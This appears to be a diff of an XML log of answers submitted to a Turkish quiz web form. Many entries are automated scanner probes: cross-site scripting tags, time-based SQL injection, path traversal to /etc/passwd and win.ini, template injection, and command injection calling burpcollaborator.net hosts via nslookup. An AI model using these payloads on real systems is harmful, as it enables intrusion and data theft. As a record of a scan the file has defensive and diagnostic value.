+    <Zaman>02.07.2021 Saat: 5.47</Zaman>
+    <Dogruluk>0</Dogruluk>
+    <Metin>1'"()&%<acx><ScRiPt >prompt(950807)</ScRiPt></Metin>
+  </CEVAP>
+  <CEVAP>
+    <Zaman>02.07.2021 Saat: 5.47</Zaman>
+    <Dogruluk>0</Dogruluk>
+    <Metin>bQe3kEan')); waitfor delay '0:0:6' -- </Metin>
+  </CEVAP>
+  <CEVAP>
+    <Zaman>02.07.2021 Saat: 5.47</Zaman>
+    <Dogruluk>0</Dogruluk>
+    <Metin>file:///etc/passwd</Metin>
+  </CEVAP>
+  <CEVAP>
+    <Zaman>02.07.2021 Saat: 5.47</Zaman>
+    <Dogruluk>0</Dogruluk>
+    <Metin>'"()&%<acx><ScRiPt >prompt(910730)</ScRiPt></Metin>
+  </CEVAP>
+  <CEVAP>
+    <Zaman>02.07.2021 Saat: 5.47</Zaman>
+    <Dogruluk>0</Dogruluk>
+    <Metin>-1;select pg_sleep(9); -- </Metin>
+  </CEVAP>
+  <CEVAP>
+    <Zaman>02.07.2021 Saat: 5.47</Zaman>
+    <Dogruluk>0</Dogruluk>
+    <Metin>@@7700R</Metin>
+  </CEVAP>
+  <CEVAP>
+    <Zaman>02.07.2021 Saat: 5.47</Zaman>
+    <Dogruluk>0</Dogruluk>
+    <Metin>1_949341</Metin>
+  </CEVAP>
+  <CEVAP>
+    <Zaman>02.07.2021 Saat: 5.47</Zaman>
+    <Dogruluk>0</Dogruluk>
+    <Metin>-1);select pg_sleep(9); -- </Metin>
+  </CEVAP>
+  <CEVAP>
+    <Zaman>02.07.2021 Saat: 5.47</Zaman>
+    <Dogruluk>0</Dogruluk>
+    <Metin>JyI=</Metin>
+  </CEVAP>
+  <CEVAP>
+    <Zaman>02.07.2021 Saat: 5.47</Zaman>
+    <Dogruluk>0</Dogruluk>
+    <Metin>WEB-INF/web.xml</Metin>
+  </CEVAP>
+  <CEVAP>
+    <Zaman>02.07.2021 Saat: 5.47</Zaman>
+    <Dogruluk>0</Dogruluk>
+    <Metin>-1));select pg_sleep(9); -- </Metin>
+  </CEVAP>
+  <CEVAP>
+    <Zaman>02.07.2021 Saat: 5.47</Zaman>
+    <Dogruluk>0</Dogruluk>
+    <Metin>¿'¿"</Metin>
+  </CEVAP>
+  <CEVAP>
+    <Zaman>02.07.2021 Saat: 5.47</Zaman>
+    <Dogruluk>0</Dogruluk>
+    <Metin>WEB-INF\web.xml</Metin>
+  </CEVAP>
+  <CEVAP>
+    <Zaman>02.07.2021 Saat: 5.47</Zaman>
+    <Dogruluk>0</Dogruluk>
+    <Metin>IKhGTYIN';select pg_sleep(9); -- </Metin>
+  </CEVAP>
+  <CEVAP>
+    <Zaman>02.07.2021 Saat: 5.47</Zaman>
+    <Dogruluk>0</Dogruluk>
+    <Metin>ğ''ğ""</Metin>
+  </CEVAP>
+  <CEVAP>
+    <Zaman>02.07.2021 Saat: 5.47</Zaman>
+    <Dogruluk>0</Dogruluk>
+    <Metin>bAfBB95v');select pg_sleep(9); -- </Metin>
+  </CEVAP>
+  <CEVAP>
+    <Zaman>02.07.2021 Saat: 5.47</Zaman>
+    <Dogruluk>0</Dogruluk>
+    <Metin>(select convert(int,CHAR(65)))</Metin>
+  </CEVAP>
+  <CEVAP>
+    <Zaman>02.07.2021 Saat: 5.47</Zaman>
+    <Dogruluk>0</Dogruluk>
+    <Metin>jw2Cs4Mq'));select pg_sleep(3); -- </Metin>
+  </CEVAP>
+  <CEVAP>
+    <Zaman>02.07.2021 Saat: 5.47</Zaman>
+    <Dogruluk>0</Dogruluk>
+    <Metin>À®À®À¯À®À®À¯À®À®À¯À®À®À¯À®À®À¯À®À®À¯À®À®À¯À®À®À¯windowsÀ¯win.ini</Metin>
+  </CEVAP>
+  <CEVAP>
+    <Zaman>02.07.2021 Saat: 5.47</Zaman>
+    <Dogruluk>0</Dogruluk>
+    <Metin>................windowswin.ini</Metin>
+  </CEVAP>
+  <CEVAP>
+    <Zaman>02.07.2021 Saat: 5.47</Zaman>
+    <Dogruluk>0</Dogruluk>
+    <Metin>/.\\./.\\./.\\./.\\./.\\./.\\./windows/win.ini</Metin>
+  </CEVAP>
+  <CEVAP>
+    <Zaman>02.07.2021 Saat: 5.47</Zaman>
+    <Dogruluk>0</Dogruluk>
+    <Metin>WEB-INF/web.xml?</Metin>
+  </CEVAP>
+  <CEVAP>
+    <Zaman>02.07.2021 Saat: 5.47</Zaman>
+    <Dogruluk>0</Dogruluk>
+    <Metin>WEB-INF\web.xml?</Metin>
+  </CEVAP>
+  <CEVAP>
+    <Zaman>02.07.2021 Saat: 8.40</Zaman>
+    <Dogruluk>0</Dogruluk>
+    <Metin>130298</Metin>
+  </CEVAP>
+  <CEVAP>
+    <Zaman>02.07.2021 Saat: 8.40</Zaman>
+    <Dogruluk>0</Dogruluk>
+    <Metin>715909</Metin>
+  </CEVAP>
+  <CEVAP>
+    <Zaman>02.07.2021 Saat: 8.40</Zaman>
+    <Dogruluk>0</Dogruluk>
+    <Metin>222949</Metin>
+  </CEVAP>
+  <CEVAP>
+    <Zaman>02.07.2021 Saat: 8.40</Zaman>
+    <Dogruluk>0</Dogruluk>
+    <Metin>787879</Metin>
+  </CEVAP>
+  <CEVAP>
+    <Zaman>02.07.2021 Saat: 8.41</Zaman>
+    <Dogruluk>0</Dogruluk>
+    <Metin>y806hx91wfkotjm0255kp51sfs8yzfrflwbl</Metin>
+  </CEVAP>
+  <CEVAP>
+    <Zaman>02.07.2021 Saat: 8.41</Zaman>
+    <Dogruluk>0</Dogruluk>
+    <Metin>rpb4y8qcdq1zau3bjgmv6gi3w3p9gq8q27sw</Metin>
+  </CEVAP>
+  <CEVAP>
+    <Zaman>02.07.2021 Saat: 8.41</Zaman>
+    <Dogruluk>0</Dogruluk>
+    <Metin>jsjf1gtkgy47d26jmop39olbzbshjyby5fv4</Metin>
+  </CEVAP>
+  <CEVAP>
+    <Zaman>02.07.2021 Saat: 8.41</Zaman>
+    <Dogruluk>0</Dogruluk>
+    <Metin>hqvpzsrwea2jbe4vk0nf70jnxnqtha9a3rtg</Metin>
+  </CEVAP>
+  <CEVAP>
+    <Zaman>02.07.2021 Saat: 8.48</Zaman>
+    <Dogruluk>0</Dogruluk>
+    <Metin>676179</Metin>
+  </CEVAP>
+  <CEVAP>
+    <Zaman>02.07.2021 Saat: 8.48</Zaman>
+    <Dogruluk>0</Dogruluk>
+    <Metin>946803</Metin>
+  </CEVAP>
+  <CEVAP>
+    <Zaman>02.07.2021 Saat: 8.48</Zaman>
+    <Dogruluk>0</Dogruluk>
+    <Metin>839522</Metin>
+  </CEVAP>
+  <CEVAP>
+    <Zaman>02.07.2021 Saat: 8.48</Zaman>
+    <Dogruluk>0</Dogruluk>
+    <Metin>461425</Metin>
+  </CEVAP>
+  <CEVAP>
+    <Zaman>02.07.2021 Saat: 8.49</Zaman>
+    <Dogruluk>0</Dogruluk>
+    <Metin>678721</Metin>
+  </CEVAP>
+  <CEVAP>
+    <Zaman>02.07.2021 Saat: 8.49</Zaman>
+    <Dogruluk>0</Dogruluk>
+    <Metin>242848</Metin>
+  </CEVAP>
+  <CEVAP>
+    <Zaman>02.07.2021 Saat: 8.49</Zaman>
+    <Dogruluk>0</Dogruluk>
+    <Metin>817680</Metin>
+  </CEVAP>
+  <CEVAP>
+    <Zaman>02.07.2021 Saat: 8.49</Zaman>
+    <Dogruluk>0</Dogruluk>
+    <Metin>492962</Metin>
+  </CEVAP>
+  <CEVAP>
+    <Zaman>02.07.2021 Saat: 8.49</Zaman>
+    <Dogruluk>0</Dogruluk>
+    <Metin>717030</Metin>
+  </CEVAP>
+  <CEVAP>
+    <Zaman>02.07.2021 Saat: 8.49</Zaman>
+    <Dogruluk>0</Dogruluk>
+    <Metin>410482</Metin>
+  </CEVAP>
+  <CEVAP>
+    <Zaman>02.07.2021 Saat: 8.49</Zaman>
+    <Dogruluk>0</Dogruluk>
+    <Metin>102470</Metin>
+  </CEVAP>
+  <CEVAP>
+    <Zaman>02.07.2021 Saat: 8.49</Zaman>
+    <Dogruluk>0</Dogruluk>
+    <Metin>922054</Metin>
+  </CEVAP>
+  <CEVAP>
+    <Zaman>02.07.2021 Saat: 8.49</Zaman>
+    <Dogruluk>0</Dogruluk>
+    <Metin>rophxmpqc40d982piul95uhhvhonf4778oyd</Metin>
+  </CEVAP>
+  <CEVAP>
+    <Zaman>02.07.2021 Saat: 8.49</Zaman>
+    <Dogruluk>0</Dogruluk>
+    <Metin>rhavq7ib5pty2tvabfeuyfa2o2h88p0s19ry</Metin>
+  </CEVAP>
+  <CEVAP>
+    <Zaman>02.07.2021 Saat: 8.49</Zaman>
+    <Dogruluk>0</Dogruluk>
+    <Metin>vgwgpthx4bsk1fuwa1dgx19onogu7bze0vqk</Metin>
+  </CEVAP>
+  <CEVAP>
+    <Zaman>02.07.2021 Saat: 8.49</Zaman>
+    <Dogruluk>0</Dogruluk>
+    <Metin>pcn3lkdo02obx6qn6s97ts5fjfcl32v5wmmb</Metin>
+  </CEVAP>
+  <CEVAP>
+    <Zaman>02.07.2021 Saat: 8.49</Zaman>
+    <Dogruluk>0</Dogruluk>
+    <Metin>939318</Metin>
+  </CEVAP>
+  <CEVAP>
+    <Zaman>02.07.2021 Saat: 8.49</Zaman>
+    <Dogruluk>0</Dogruluk>
+    <Metin>578785</Metin>
+  </CEVAP>
+  <CEVAP>
+    <Zaman>02.07.2021 Saat: 8.49</Zaman>
+    <Dogruluk>0</Dogruluk>
+    <Metin>692677</Metin>
+  </CEVAP>
+  <CEVAP>
+    <Zaman>02.07.2021 Saat: 8.49</Zaman>
+    <Dogruluk>0</Dogruluk>
+    <Metin>280881</Metin>
+  </CEVAP>
+  <CEVAP>
+    <Zaman>02.07.2021 Saat: 8.50</Zaman>
+    <Dogruluk>0</Dogruluk>
+    <Metin>ohwhqtix5btk2fvwb1egy1aooohu8b0fxwnl</Metin>
+  </CEVAP>
+  <CEVAP>
+    <Zaman>02.07.2021 Saat: 8.50</Zaman>
+    <Dogruluk>0</Dogruluk>
+    <Metin>ng7op4h84msv1qu7acdrxc9znzg57mzqw7mw</Metin>
+  </CEVAP>
+  <CEVAP>
+    <Zaman>02.07.2021 Saat: 8.50</Zaman>
+    <Dogruluk>0</Dogruluk>
+    <Metin>q7u2gr8vv9jisdlu1z4eoz0mem7sy9qdnudj</Metin>
+  </CEVAP>
+  <CEVAP>
+    <Zaman>02.07.2021 Saat: 8.50</Zaman>
+    <Dogruluk>0</Dogruluk>
+    <Metin>pjpcsmkq74vd48xpdug90uchqhjna428zppe</Metin>
+  </CEVAP>
+  <CEVAP>
+    <Zaman>02.07.2021 Saat: 8.50</Zaman>
+    <Dogruluk>0</Dogruluk>
+    <Metin>220184</Metin>
+  </CEVAP>
+  <CEVAP>
+    <Zaman>02.07.2021 Saat: 8.50</Zaman>
+    <Dogruluk>0</Dogruluk>
+    <Metin>431779</Metin>
+  </CEVAP>
+  <CEVAP>
+    <Zaman>02.07.2021 Saat: 8.50</Zaman>
+    <Dogruluk>0</Dogruluk>
+    <Metin>182410</Metin>
+  </CEVAP>
+  <CEVAP>
+    <Zaman>02.07.2021 Saat: 8.50</Zaman>
+    <Dogruluk>0</Dogruluk>
+    <Metin>816793</Metin>
+  </CEVAP>
+  <CEVAP>
+    <Zaman>02.07.2021 Saat: 8.50</Zaman>
+    <Dogruluk>0</Dogruluk>
+    <Metin>m9oyilapx3lcu7no3t68qt2ggg9m03s8mpce</Metin>
+  </CEVAP>
+  <CEVAP>
+    <Zaman>02.07.2021 Saat: 8.50</Zaman>
+    <Dogruluk>0</Dogruluk>
+    <Metin>ykvjtslw8awj5eyve0hf10dnrnktba3fxwnl</Metin>
+  </CEVAP>
+  <CEVAP>
+    <Zaman>02.07.2021 Saat: 8.50</Zaman>
+    <Dogruluk>0</Dogruluk>
+    <Metin>rmlbvinma0y9740lgqj53qfdtdmjd055zmpb</Metin>
+  </CEVAP>
+  <CEVAP>
+    <Zaman>02.07.2021 Saat: 8.50</Zaman>
+    <Dogruluk>0</Dogruluk>
+    <Metin>o3y2cv4zrdfmohhyx30ik3wqaq3wudmigz6o</Metin>
+  </CEVAP>
+  <CEVAP>
+    <Zaman>02.07.2021 Saat: 8.52</Zaman>
+    <Dogruluk>0</Dogruluk>
+    <Metin>269542</Metin>
+  </CEVAP>
+  <CEVAP>
+    <Zaman>02.07.2021 Saat: 8.52</Zaman>
+    <Dogruluk>0</Dogruluk>
+    <Metin>535199</Metin>
+  </CEVAP>
+  <CEVAP>
+    <Zaman>02.07.2021 Saat: 8.52</Zaman>
+    <Dogruluk>0</Dogruluk>
+    <Metin>153870</Metin>
+  </CEVAP>
+  <CEVAP>
+    <Zaman>02.07.2021 Saat: 8.52</Zaman>
+    <Dogruluk>0</Dogruluk>
+    <Metin>813178</Metin>
+  </CEVAP>
+  <CEVAP>
+    <Zaman>02.07.2021 Saat: 8.54</Zaman>
+    <Dogruluk>0</Dogruluk>
+    <Metin>301862</Metin>
+  </CEVAP>
+  <CEVAP>
+    <Zaman>02.07.2021 Saat: 8.54</Zaman>
+    <Dogruluk>0</Dogruluk>
+    <Metin>898788</Metin>
+  </CEVAP>
+  <CEVAP>
+    <Zaman>02.07.2021 Saat: 8.54</Zaman>
+    <Dogruluk>0</Dogruluk>
+    <Metin>441352</Metin>
+  </CEVAP>
+  <CEVAP>
+    <Zaman>02.07.2021 Saat: 8.54</Zaman>
+    <Dogruluk>0</Dogruluk>
+    <Metin>431754</Metin>
+  </CEVAP>
+  <CEVAP>
+    <Zaman>02.07.2021 Saat: 8.56</Zaman>
+    <Dogruluk>0</Dogruluk>
+    <Metin>624010</Metin>
+  </CEVAP>
+  <CEVAP>
+    <Zaman>02.07.2021 Saat: 8.56</Zaman>
+    <Dogruluk>0</Dogruluk>
+    <Metin>290265</Metin>
+  </CEVAP>
+  <CEVAP>
+    <Zaman>02.07.2021 Saat: 8.56</Zaman>
+    <Dogruluk>0</Dogruluk>
+    <Metin>623752</Metin>
+  </CEVAP>
+  <CEVAP>
+    <Zaman>02.07.2021 Saat: 8.56</Zaman>
+    <Dogruluk>0</Dogruluk>
+    <Metin>899296</Metin>
+  </CEVAP>
+  <CEVAP>
+    <Zaman>02.07.2021 Saat: 8.57</Zaman>
+    <Dogruluk>0</Dogruluk>
+    <Metin>755513</Metin>
+  </CEVAP>
+  <CEVAP>
+    <Zaman>02.07.2021 Saat: 8.57</Zaman>
+    <Dogruluk>0</Dogruluk>
+    <Metin>974961</Metin>
+  </CEVAP>
+  <CEVAP>
+    <Zaman>02.07.2021 Saat: 8.57</Zaman>
+    <Dogruluk>0</Dogruluk>
+    <Metin>591151</Metin>
+  </CEVAP>
+  <CEVAP>
+    <Zaman>02.07.2021 Saat: 8.57</Zaman>
+    <Dogruluk>0</Dogruluk>
+    <Metin>547472</Metin>
+  </CEVAP>
+  <CEVAP>
+    <Zaman>02.07.2021 Saat: 10.15</Zaman>
+    <Dogruluk>0</Dogruluk>
+    <Metin>993763</Metin>
+  </CEVAP>
+  <CEVAP>
+    <Zaman>02.07.2021 Saat: 10.15</Zaman>
+    <Dogruluk>0</Dogruluk>
+    <Metin>993763</Metin>
+  </CEVAP>
+  <CEVAP>
+    <Zaman>02.07.2021 Saat: 10.16</Zaman>
+    <Dogruluk>0</Dogruluk>
+    <Metin>993763'</Metin>
+  </CEVAP>
+  <CEVAP>
+    <Zaman>02.07.2021 Saat: 10.16</Zaman>
+    <Dogruluk>0</Dogruluk>
+    <Metin>(select*from(select(sleep(20)))a)</Metin>
+  </CEVAP>
+  <CEVAP>
+    <Zaman>02.07.2021 Saat: 10.16</Zaman>
+    <Dogruluk>0</Dogruluk>
+    <Metin>993763'(select*from(select(sleep(20)))a)'</Metin>
+  </CEVAP>
+  <CEVAP>
+    <Zaman>02.07.2021 Saat: 10.16</Zaman>
+    <Dogruluk>0</Dogruluk>
+    <Metin>993763+(select*from(select(sleep(20)))a)+</Metin>
+  </CEVAP>
+  <CEVAP>
+    <Zaman>02.07.2021 Saat: 10.16</Zaman>
+    <Dogruluk>0</Dogruluk>
+    <Metin>993763'+(select*from(select(sleep(20)))a)+'</Metin>
+  </CEVAP>
+  <CEVAP>
+    <Zaman>02.07.2021 Saat: 10.16</Zaman>
+    <Dogruluk>0</Dogruluk>
+    <Metin>993763 and (select*from(select(sleep(20)))a)-- </Metin>
+  </CEVAP>
+  <CEVAP>
+    <Zaman>02.07.2021 Saat: 10.16</Zaman>
+    <Dogruluk>0</Dogruluk>
+    <Metin>993763' and (select*from(select(sleep(20)))a)-- </Metin>
+  </CEVAP>
+  <CEVAP>
+    <Zaman>02.07.2021 Saat: 10.16</Zaman>
+    <Dogruluk>0</Dogruluk>
+    <Metin>993763,(select*from(select(sleep(20)))a)</Metin>
+  </CEVAP>
+  <CEVAP>
+    <Zaman>02.07.2021 Saat: 10.16</Zaman>
+    <Dogruluk>0</Dogruluk>
+    <Metin>993763 waitfor delay'0:0:20'--</Metin>
+  </CEVAP>
+  <CEVAP>
+    <Zaman>02.07.2021 Saat: 10.16</Zaman>
+    <Dogruluk>0</Dogruluk>
+    <Metin>993763' waitfor delay'0:0:20'--</Metin>
+  </CEVAP>
+  <CEVAP>
+    <Zaman>02.07.2021 Saat: 10.16</Zaman>
+    <Dogruluk>0</Dogruluk>
+    <Metin>993763)waitfor delay'0:0:20'--</Metin>
+  </CEVAP>
+  <CEVAP>
+    <Zaman>02.07.2021 Saat: 10.16</Zaman>
+    <Dogruluk>0</Dogruluk>
+    <Metin>993763')waitfor delay'0:0:20'--</Metin>
+  </CEVAP>
+  <CEVAP>
+    <Zaman>02.07.2021 Saat: 10.16</Zaman>
+    <Dogruluk>0</Dogruluk>
+    <Metin>993763,0)waitfor delay'0:0:20'--</Metin>
+  </CEVAP>
+  <CEVAP>
+    <Zaman>02.07.2021 Saat: 10.16</Zaman>
+    <Dogruluk>0</Dogruluk>
+    <Metin>993763',0)waitfor delay'0:0:20'--</Metin>
+  </CEVAP>
+  <CEVAP>
+    <Zaman>02.07.2021 Saat: 10.16</Zaman>
+    <Dogruluk>0</Dogruluk>
+    <Metin>99376386564107 or 7323=07323</Metin>
+  </CEVAP>
+  <CEVAP>
+    <Zaman>02.07.2021 Saat: 10.16</Zaman>
+    <Dogruluk>0</Dogruluk>
+    <Metin>99376370844491 or 8744=8749</Metin>
+  </CEVAP>
+  <CEVAP>
+    <Zaman>02.07.2021 Saat: 10.16</Zaman>
+    <Dogruluk>0</Dogruluk>
+    <Metin>99376326896501 or 3588=03588-- </Metin>
+  </CEVAP>
+  <CEVAP>
+    <Zaman>02.07.2021 Saat: 10.17</Zaman>
+    <Dogruluk>0</Dogruluk>
+    <Metin>99376320586337 or 4243=4249-- </Metin>
+  </CEVAP>
+  <CEVAP>
+    <Zaman>02.07.2021 Saat: 10.17</Zaman>
+    <Dogruluk>0</Dogruluk>
+    <Metin>993763 and 4052=04052</Metin>
+  </CEVAP>
+  <CEVAP>
+    <Zaman>02.07.2021 Saat: 10.17</Zaman>
+    <Dogruluk>0</Dogruluk>
+    <Metin>993763 and 7829=7834</Metin>
+  </CEVAP>
+  <CEVAP>
+    <Zaman>02.07.2021 Saat: 10.17</Zaman>
+    <Dogruluk>0</Dogruluk>
+    <Metin>993763 and 3629=03629-- </Metin>
+  </CEVAP>
+  <CEVAP>
+    <Zaman>02.07.2021 Saat: 10.17</Zaman>
+    <Dogruluk>0</Dogruluk>
+    <Metin>993763 and 8066=8069-- </Metin>
+  </CEVAP>
+  <CEVAP>
+    <Zaman>02.07.2021 Saat: 10.17</Zaman>
+    <Dogruluk>0</Dogruluk>
+    <Metin>99376335868715' or '3151'='3151</Metin>
+  </CEVAP>
+  <CEVAP>
+    <Zaman>02.07.2021 Saat: 10.17</Zaman>
+    <Dogruluk>0</Dogruluk>
+    <Metin>99376387676837' or '7098'='7106</Metin>
+  </CEVAP>
+  <CEVAP>
+    <Zaman>02.07.2021 Saat: 10.17</Zaman>
+    <Dogruluk>0</Dogruluk>
+    <Metin>99376318705109' or 6026=6026-- </Metin>
+  </CEVAP>
+  <CEVAP>
+    <Zaman>02.07.2021 Saat: 10.17</Zaman>
+    <Dogruluk>0</Dogruluk>
+    <Metin>99376374831198' or 1877=1885-- </Metin>
+  </CEVAP>
+  <CEVAP>
+    <Zaman>02.07.2021 Saat: 10.17</Zaman>
+    <Dogruluk>0</Dogruluk>
+    <Metin>993763' and '9347'='9347</Metin>
+  </CEVAP>
+  <CEVAP>
+    <Zaman>02.07.2021 Saat: 10.17</Zaman>
+    <Dogruluk>0</Dogruluk>
+    <Metin>993763' and '6480'='6484</Metin>
+  </CEVAP>
+  <CEVAP>
+    <Zaman>02.07.2021 Saat: 10.17</Zaman>
+    <Dogruluk>0</Dogruluk>
+    <Metin>993763' and 5844=5844-- </Metin>
+  </CEVAP>
+  <CEVAP>
+    <Zaman>02.07.2021 Saat: 10.17</Zaman>
+    <Dogruluk>0</Dogruluk>
+    <Metin>993763' and 4203=4212-- </Metin>
+  </CEVAP>
+  <CEVAP>
+    <Zaman>02.07.2021 Saat: 10.17</Zaman>
+    <Dogruluk>0</Dogruluk>
+    <Metin>993763"</Metin>
+  </CEVAP>
+  <CEVAP>
+    <Zaman>02.07.2021 Saat: 10.17</Zaman>
+    <Dogruluk>0</Dogruluk>
+    <Metin>lpps5ax4av</Metin>
+  </CEVAP>
+  <CEVAP>
+    <Zaman>02.07.2021 Saat: 10.17</Zaman>
+    <Dogruluk>0</Dogruluk>
+    <Metin>993763ymdzcb72y2</Metin>
+  </CEVAP>
+  <CEVAP>
+    <Zaman>02.07.2021 Saat: 10.17</Zaman>
+    <Dogruluk>0</Dogruluk>
+    <Metin>mjyw8${625*647}vp1gk</Metin>
+  </CEVAP>
+  <CEVAP>
+    <Zaman>02.07.2021 Saat: 10.17</Zaman>
+    <Dogruluk>0</Dogruluk>
+    <Metin>tm25d{{393*805}}a064t</Metin>
+  </CEVAP>
+  <CEVAP>
+    <Zaman>02.07.2021 Saat: 10.17</Zaman>
+    <Dogruluk>0</Dogruluk>
+    <Metin>993763}}vun1q'/"<y3x08</Metin>
+  </CEVAP>
+  <CEVAP>
+    <Zaman>02.07.2021 Saat: 10.17</Zaman>
+    <Dogruluk>0</Dogruluk>
+    <Metin>993763%}g4x8g'/"<r0q8k</Metin>
+  </CEVAP>
+  <CEVAP>
+    <Zaman>02.07.2021 Saat: 10.17</Zaman>
+    <Dogruluk>0</Dogruluk>
+    <Metin>993763uyh49%>zgnrj'/"<h0jkq</Metin>
+  </CEVAP>
+  <CEVAP>
+    <Zaman>02.07.2021 Saat: 10.18</Zaman>
+    <Dogruluk>0</Dogruluk>
+    <Metin>993763'+sleep(20.to_i)+'</Metin>
+  </CEVAP>
+  <CEVAP>
+    <Zaman>02.07.2021 Saat: 10.18</Zaman>
+    <Dogruluk>0</Dogruluk>
+    <Metin>993763'.sleep(20).'</Metin>
+  </CEVAP>
+  <CEVAP>
+    <Zaman>02.07.2021 Saat: 10.18</Zaman>
+    <Dogruluk>0</Dogruluk>
+    <Metin>993763{${sleep(20)}}</Metin>
+  </CEVAP>
+  <CEVAP>
+    <Zaman>02.07.2021 Saat: 10.18</Zaman>
+    <Dogruluk>0</Dogruluk>
+    <Metin>seat4brvazt5lha6z6imeh723t9mxfn3fr7ex2m.burpcollaborator.net</Metin>
+  </CEVAP>
+  <CEVAP>
+    <Zaman>02.07.2021 Saat: 10.18</Zaman>
+    <Dogruluk>0</Dogruluk>
+    <Metin>http://qpjrf92tlx43wfl4a4tkpfi0erkk8dy1opgc60v.burpcollaborator.net/?787879</Metin>
+  </CEVAP>
+  <CEVAP>
+    <Zaman>02.07.2021 Saat: 10.18</Zaman>
+    <Dogruluk>0</Dogruluk>
+    <Metin>nslookup -q=cname 7jr89qwafeykqwfl4ln1jwch88e12usill9dw3ks.burpcollaborator.net.&</Metin>
+  </CEVAP>
+  <CEVAP>
+    <Zaman>02.07.2021 Saat: 10.18</Zaman>
+    <Dogruluk>0</Dogruluk>
+    <Metin>993763|nslookup -q=cname siet8bvvezx5phe636mmihb27tdm1fr3nrfe52u.burpcollaborator.net.&</Metin>
+  </CEVAP>
+  <CEVAP>
+    <Zaman>02.07.2021 Saat: 10.18</Zaman>
+    <Dogruluk>0</Dogruluk>
+    <Metin>993763'"`0&nslookup -q=cname lj8m94wofsyyqafz4znfjacv8mef28swpkh77vw.burpcollaborator.net.&`'</Metin>
+  </CEVAP>
+  <CEVAP>
+    <Zaman>02.07.2021 Saat: 10.18</Zaman>
+    <Dogruluk>0</Dogruluk>
+    <Metin>993763&nslookup -q=cname 76b8wqja2elkdw2lrla16wzhv811pufia62tshh.burpcollaborator.net.&'\"`0&nslookup -q=cname 76b8wqja2elkdw2lrla16wzhv811pufia62tshh.burpcollaborator.net.&`'</Metin>
+  </CEVAP>
+  <CEVAP>
+    <Zaman>02.07.2021 Saat: 10.18</Zaman>
+    <Dogruluk>0</Dogruluk>
+    <Metin>993763|echo 0ccltg1rey lv6k6sraea||a #' |echo 0ccltg1rey lv6k6sraea||a #|" |echo 0ccltg1rey lv6k6sraea||a #</Metin>
+  </CEVAP>
+  <CEVAP>
+    <Zaman>02.07.2021 Saat: 10.18</Zaman>
+    <Dogruluk>0</Dogruluk>
+    <Metin>993763&echo d3j6v3v6s2 0av5ectkvf&</Metin>
+  </CEVAP>
+  <CEVAP>
+    <Zaman>02.07.2021 Saat: 10.18</Zaman>
+    <Dogruluk>0</Dogruluk>
+    <Metin>993763"|echo m4mrq5bbg6 2hezg98hlh ||</Metin>
+  </CEVAP>
+  <CEVAP>
+    <Zaman>02.07.2021 Saat: 10.18</Zaman>
+    <Dogruluk>0</Dogruluk>
+    <Metin>993763'|echo wbk0azersw hznjyfvmuy #xzwx</Metin>
+  </CEVAP>
+  <CEVAP>
+    <Zaman>02.07.2021 Saat: 10.18</Zaman>
+    <Dogruluk>0</Dogruluk>
+    <Metin>993763|ping -n 21 127.0.0.1||`ping -c 21 127.0.0.1` #' |ping -n 21 127.0.0.1||`ping -c 21 127.0.0.1` #\" |ping -n 21 127.0.0.1</Metin>
+  </CEVAP>
+  <CEVAP>
+    <Zaman>02.07.2021 Saat: 10.18</Zaman>
+    <Dogruluk>0</Dogruluk>
+    <Metin>993763|ping -c 21 127.0.0.1||x</Metin>
+  </CEVAP>
+  <CEVAP>
+    <Zaman>02.07.2021 Saat: 10.18</Zaman>
+    <Dogruluk>0</Dogruluk>
+    <Metin>993763&ping -n 21 127.0.0.1&</Metin>
+  </CEVAP>
+  <CEVAP>
+    <Zaman>02.07.2021 Saat: 10.18</Zaman>
+    <Dogruluk>0</Dogruluk>
+    <Metin>993763'|ping -c 21 127.0.0.1 #</Metin>
+  </CEVAP>
+  <CEVAP>
+    <Zaman>02.07.2021 Saat: 10.18</Zaman>
+    <Dogruluk>0</Dogruluk>
+    <Metin>993763"|ping -n 21 127.0.0.1 ||</Metin>
+  </CEVAP>
+  <CEVAP>
+    <Zaman>02.07.2021 Saat: 10.19</Zaman>
+    <Dogruluk>0</Dogruluk>
+    <Metin>c:\windows\win.ini</Metin>
+  </CEVAP>
+  <CEVAP>
+    <Zaman>02.07.2021 Saat: 10.19</Zaman>
+    <Dogruluk>0</Dogruluk>
+    <Metin>\windows\win.ini</Metin>
+  </CEVAP>
+  <CEVAP>
+    <Zaman>02.07.2021 Saat: 10.19</Zaman>
+    <Dogruluk>0</Dogruluk>
+    <Metin>file:///c:/windows/win.ini</Metin>
+  </CEVAP>
+  <CEVAP>
+    <Zaman>02.07.2021 Saat: 10.19</Zaman>
+    <Dogruluk>0</Dogruluk>
+    <Metin>...\.\...\.\...\.\...\.\...\.\...\.\...\.\...\.\...\.\...\.\windows\win.ini</Metin>
+  </CEVAP>
+  <CEVAP>
+    <Zaman>02.07.2021 Saat: 10.19</Zaman>
+    <Dogruluk>0</Dogruluk>
+    <Metin>À®À®ÀœÀ®À®ÀœÀ®À®ÀœÀ®À®ÀœÀ®À®ÀœÀ®À®ÀœÀ®À®ÀœÀ®À®ÀœÀ®À®ÀœÀ®À®ÀœwindowsÀœwin.ini</Metin>
+  </CEVAP>
+  <CEVAP>
+    <Zaman>02.07.2021 Saat: 10.20</Zaman>
+    <Dogruluk>0</Dogruluk>
+    <Metin>993763</Metin>
+  </CEVAP>
+  <CEVAP>
+    <Zaman>02.07.2021 Saat: 10.20</Zaman>
+    <Dogruluk>0</Dogruluk>
+    <Metin>file:///etc/passwd</Metin>
+  </CEVAP>
+  <CEVAP>
+    <Zaman>02.07.2021 Saat: 10.20</Zaman>
+    <Dogruluk>0</Dogruluk>
+    <Metin>À®À®À¯À®À®À¯À®À®À¯À®À®À¯À®À®À¯À®À®À¯À®À®À¯À®À®À¯À®À®À¯À®À®À¯etcÀ¯passwd</Metin>
+  </CEVAP>
+  <CEVAP>
+    <Zaman>02.07.2021 Saat: 10.20</Zaman>
+    <Dogruluk>0</Dogruluk>
+    <Metin>.../787879</Metin>
+  </CEVAP>
+  <CEVAP>
+    <Zaman>02.07.2021 Saat: 10.20</Zaman>
+    <Dogruluk>0</Dogruluk>
+    <Metin>./ormana_giden.php</Metin>
+  </CEVAP>
+  <CEVAP>
+    <Zaman>02.07.2021 Saat: 10.20</Zaman>
+    <Dogruluk>0</Dogruluk>
+    <Metin>/./ormana_giden.php</Metin>
+  </CEVAP>
+  <CEVAP>
+    <Zaman>02.07.2021 Saat: 10.20</Zaman>
+    <Dogruluk>0</Dogruluk>
+    <Metin>993763</Metin>
+  </CEVAP>
+  <CEVAP>
+    <Zaman>02.07.2021 Saat: 10.20</Zaman>
+    <Dogruluk>0</Dogruluk>
